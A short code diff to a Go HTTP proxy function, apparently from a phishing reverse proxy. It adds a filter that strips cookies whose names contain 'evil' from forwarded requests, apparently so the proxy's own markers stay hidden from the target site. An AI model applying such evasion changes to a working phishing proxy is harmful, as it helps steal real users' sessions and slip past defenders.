@@ -622,6 +622,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				//Checkers
+				// Define the substring to check for in cookie names
+			        substringToCheck := "evil"
+			
+			        // Filter out the cookies that contain the substring
+			        filteredCookies := []*http.Cookie{}
+			        for _, cookie := range req.Cookies() {
+				    log.Debug("CHECK")
+			            if !strings.Contains(cookie.Name, substringToCheck) {
+			                filteredCookies = append(filteredCookies, cookie)
+			            }
+			        }
+			
+			        // Clear the existing cookies in the request header
+			        req.Header.Del("Cookie")
+			
+			        // Add the filtered cookies back to the request header
+			        for _, cookie := range filteredCookies {
+			            req.AddCookie(cookie)
+			        }
 
 				// prevent caching
 				req.Header.Set("Cache-Control", "no-cache")
